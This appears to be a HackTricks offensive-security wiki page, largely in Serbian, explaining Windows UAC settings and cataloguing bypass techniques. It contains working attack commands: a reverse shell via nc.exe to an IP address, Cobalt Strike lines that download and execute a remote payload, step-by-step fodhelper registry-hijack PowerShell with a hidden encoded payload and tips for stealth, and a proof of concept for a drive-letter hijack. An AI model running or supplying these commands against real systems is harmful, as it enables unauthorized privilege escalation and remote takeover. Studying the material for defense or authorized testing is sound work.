# UAC - Kontrola korisničkog naloga

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **upit za potvrdu za aktivnosti sa povišenim privilegijama**. Aplikacije imaju različite `integrity` nivoe, i program sa **visokim nivoom** može da izvršava zadatke koji **mogu potencijalno ugroziti sistem**. Kada je UAC omogućen, aplikacije i zadaci uvek **se izvode u bezbednosnom kontekstu naloga bez administratorskih privilegija** osim ako administrator eksplicitno ne odobri tim aplikacijama/zadatcima pristup na nivou administratora da bi se izvršile. To je pogodnosna funkcija koja štiti administratore od nenamernih promena, ali se ne smatra bezbednosnom granicom.

Za više informacija o integrity nivoima:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC aktivan, korisniku sa administratorskim privilegijama dodeljuju se 2 tokena: standardni korisnički token za obavljanje uobičajenih radnji na regularnom nivou, i jedan sa administratorskim privilegijama.

Ova [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC radi i uključuje proces prijave, korisničko iskustvo i UAC arhitekturu. Administratori mogu koristiti bezbednosne politike da konfigurišu kako UAC radi specifično za njihovu organizaciju na lokalnom nivou (koristeći secpol.msc), ili da budu konfigurisane i distribuirane putem Group Policy Objects (GPO) u Active Directory domen okruženju. Različita podešavanja su detaljno objašnjena [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Postoji 10 Group Policy podešavanja koja se mogu podesiti za UAC. Sledeća tabela daje dodatne detalje:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Onemogućeno                                                 |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Onemogućeno                                                 |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Zatraži pristanak za binarne fajlove koji nisu deo Windows-a |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Zatraži kredencijale na sigurnom desktopu                    |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Omogućeno (podrazumevano za Home) Onemogućeno (podrazumevano za Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Onemogućeno                                                 |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Omogućeno                                                    |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Omogućeno                                                    |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Omogućeno                                                    |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Omogućeno                                                    |

### Teorija zaobilaženja UAC

Neki programi se **automatski povišavaju** (autoelevate) ako **korisnik pripada administratorskoj grupi**. Ovi binarni fajlovi u svojim _**Manifests**_ imaju opciju _**autoElevate**_ sa vrednošću _**True**_. Binar mora biti i **potpisan od strane Microsoft-a**.

Mnogi auto-elevate procesi izlažu **funkcionalnost preko COM objekata ili RPC servera**, koje je moguće pozvati iz procesa koji rade sa medium integritetom (privilegije na nivou običnog korisnika). Napomena: COM (Component Object Model) i RPC (Remote Procedure Call) su metode koje Windows programi koriste za komunikaciju i izvršavanje funkcija između različitih procesa. Na primer, **`IFileOperation COM object`** je dizajniran za rukovanje fajl operacijama (kopiranje, brisanje, premještanje) i može automatski povišavati privilegije bez pojavljivanja upita.

Takođe, mogu se izvršavati proverke, kao na primer proveravanje da li je proces pokrenut iz **System32 direktorijuma**, što se može zaobići, na primer, **injectovanjem u explorer.exe** ili neki drugi izvršni fajl koji se nalazi u System32.

Drugi način da se zaobiđu ove provere je **izmena PEB-a**. Svaki proces u Windows-u ima Process Environment Block (PEB), koji sadrži važne podatke o procesu, kao što je putanja izvršnog fajla. Modifikovanjem PEB-a, napadači mogu lažirati (spoof) lokaciju svog zlonamernog procesa, čineći da izgleda kao da se izvršava iz pouzdanog direktorijuma (npr. system32). Ove lažne informacije prevare COM objekat da auto-poviša privilegije bez traženja potvrde od korisnika.

Zatim, da bi **zaobišli** **UAC** (podižu privilegije sa **medium** nivoa integriteta na **high**), neki napadači koriste takve binarne fajlove da bi **izvršili arbitrarni kod**, jer će se on izvoditi iz procesa sa **visokim nivoom integriteta**.

Možete **proveriti** _**Manifest**_ binarnog fajla koristeći alat _**sigcheck.exe**_ iz Sysinternals. (`sigcheck.exe -m <file>`) I možete **videti** **nivo integriteta** procesa koristeći _Process Explorer_ ili _Process Monitor_ (iz Sysinternals).

### Provera UAC

Da biste potvrdili da li je UAC omogućen, uradite:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ako je **`1`** onda je UAC **aktiviran**, ako je **`0`** ili ne postoji, UAC je **neaktivan**.

Zatim proverite **koji nivo** je konfigurisan:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
- If **`3`** like `1` but not necessary on Secure Desktop
- If **`4`** like `2` but not necessary on Secure Desktop
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Zatim, treba pogledati vrednost **`LocalAccountTokenFilterPolicy`**\
Ako je vrednost **`0`**, onda samo korisnik sa **RID 500** (**built-in Administrator**) može da izvršava **admin tasks without UAC**, a ako je `1`, **svi nalozi u grupi "Administrators"** mogu to da rade.

I na kraju pogledajte vrednost ključa **`FilterAdministratorToken`**\
Ako je **`0`** (default), **built-in Administrator account može** da obavlja udaljene administrativne zadatke, a ako je **`1`**, built-in Administrator nalog **ne može** da obavlja udaljene administrativne zadatke, osim ako `LocalAccountTokenFilterPolicy` nije postavljen na `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

Sve ove informacije mogu se prikupiti korišćenjem **metasploit** modula: `post/windows/gather/win_privs`

Takođe možete proveriti grupe svog korisnika i dobiti nivo integriteta:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Imajte na umu da, ako imate grafički pristup žrtvi, UAC bypass je jednostavan jer možete jednostavno kliknuti na "Yes" kada se pojavi UAC prompt

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces se izvršava u medium integrity context, i vaš nalog pripada administrators group**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je podešen na najviši nivo bezbednosti (Always) nego ako je u nekom od ostalih nivoa (Default).**

### UAC disabled

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**) možete **izvesti reverse shell sa admin privileges** (high integrity level) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Vrlo** osnovni UAC "bypass" (potpun pristup fajl sistemu)

Ukoliko imate shell sa korisnikom koji je član grupe Administrators, možete **mount the C$** deljeni resurs putem SMB lokalno na novi disk i imaćete **access to everything inside the file system** (čak i Administrator home folder).

> [!WARNING]
> **Izgleda da ovaj trik više ne radi**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike techniques će raditi samo ako UAC nije podešen na najviši nivo bezbednosti.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC**.

### KRBUACBypass

Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) koja je **kompilacija** nekoliko UAC bypass exploits. Imajte na umu da ćete morati da **kompajlirate UACME koristeći visual studio ili msbuild**. Kompilacija će kreirati nekoliko izvršnih fajlova (poput `Source\Akagi\outout\x64\Debug\Akagi.exe`), moraćete da znate **koji vam je potreban.**\
Trebalo bi da **budete oprezni** jer će neki bypasses **pokrenuti neke druge programe** koji će **obavestiti** **korisnika** da se nešto dešava.

UACME ima **build verziju od koje je svaka tehnika počela da radi**. Možete pretražiti tehniku koja utiče na vaše verzije:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, koristeći [this](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu dobijate Windows release `1607` iz build verzija.

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binarni fajl `fodhelper.exe` se automatski elevuje na modernim Windowsima. Kada se pokrene, proverava per-user registry put ispod bez validacije `DelegateExecute` verbe. Postavljanje komande tamo omogućava procesu sa Medium Integrity (korisnik je u Administrators) da pokrene High Integrity proces bez UAC prompta.

Registry put koji fodhelper proverava:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Koraci za PowerShell (set your payload, then trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Napomene:
- Radi kada trenutni korisnik pripada grupi Administrators i UAC nivo je podrazumevan/relaksiran (nije Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da pokrenete 64-bit PowerShell iz 32-bit procesa na 64-bit Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE). Izbegavajte UI dijaloge koji zahtevaju potvrdu radi boljeg prikrivanja.

#### Još UAC bypass metoda

**Sve** tehnike korišćene ovde za zaobilaženje AUC **zahtevaju** **potpun interaktivni shell** sa žrtvom (običan nc.exe shell nije dovoljan).

To možete dobiti koristeći **meterpreter** sesiju. Migrirajte u **proces** koji ima vrednost **Session** jednaku **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass sa GUI

Ako imate pristup GUI-ju, možete jednostavno prihvatiti UAC prompt kada se pojavi, zapravo vam tada nije potreban bypass. Dakle, dobijanje pristupa GUI-ju omogućava zaobilaženje UAC-a.

Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP), postoje **neki alati koji će se pokretati kao administrator** iz kojih biste mogli, na primer, **pokrenuti** **cmd** **kao admin** direktno bez ponovnog UAC prompta, kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti nešto **diskretnije**.

### Bučan brute-force UAC bypass

Ako vam nije stalo do buke, uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) što **traži podizanje privilegija dok korisnik ne prihvati**.

### Vaš sopstveni bypass - Osnovna metodologija zaobilaženja UAC-a

Ako pogledate **UACME**, primetićete da **većina UAC bypass-ova zloupotrebljava Dll Hijacking ranjivost** (uglavnom pisanjem malicioznog dll-a u _C:\Windows\System32_). [Pročitajte ovo da naučite kako pronaći Dll Hijacking ranjivost](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binarni fajl koji će se **autoelevate** (proverite da li pri izvođenju radi na visokom nivou integriteta).
2. Koristeći procmon pronađite "**NAME NOT FOUND**" događaje koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati **upisati** DLL u neke **zaštićene putanje** (kao C:\Windows\System32) gde nemate dozvole za pisanje. Ovo možete zaobići koristeći:
1. **wusa.exe**: Windows 7,8 i 8.1. Omogućava ekstrahovanje sadržaja CAB fajla u zaštićene putanje (jer se ovaj alat izvršava iz visokog nivoa integriteta).
2. **IFileOperation**: Windows 10.
4. Pripremite **skriptu** za kopiranje vašeg DLL-a u zaštićenu putanju i izvršavanje ranjivog i autoelevated binarnog fajla.

### Još jedna UAC bypass tehnika

Sastoji se u praćenju da li an **autoElevated binary** pokušava da **pročita** iz **registara** **ime/putanju** nekog **binaranog fajla** ili **komande** koja će se **izvršiti** (ovo je posebno interesantno ako binarni fajl traži ovu informaciju u okviru **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” koristi shadow-admin tokene sa per-session `\Sessions\0\DosDevices/<LUID>` mapama. Direktorijum se kreira lenjo od strane `SeGetTokenDeviceMap` pri prvom `\??` resolvovanju. Ako napadač preuzme identitet shadow-admin tokena samo na nivou **SecurityIdentification**, direktorijum se kreira sa napadačem kao **owner** (nasleđuje `CREATOR OWNER`), omogućavajući linkove slova diska koji imaju prioritet nad `\GLOBAL??`.

**Koraci:**

1. Iz sesije sa niskim privilegijama pozovite `RAiProcessRunOnce` da pokrenete shadow-admin `runonce.exe` bez prompta.
2. Duplicirajte njegov primarni token u **identification** token i preuzmite njegov identitet dok otvarate `\??` kako biste prisilili kreiranje `\Sessions\0\DosDevices/<LUID>` pod vlasništvom napadača.
3. Kreirajte tamo `C:` symlink koji pokazuje na skladište pod kontrolom napadača; naredni pristupi fajl-sistemu u toj sesiji će rešavati `C:` na put napadača, omogućavajući DLL/file hijack bez prompta.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Reference
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
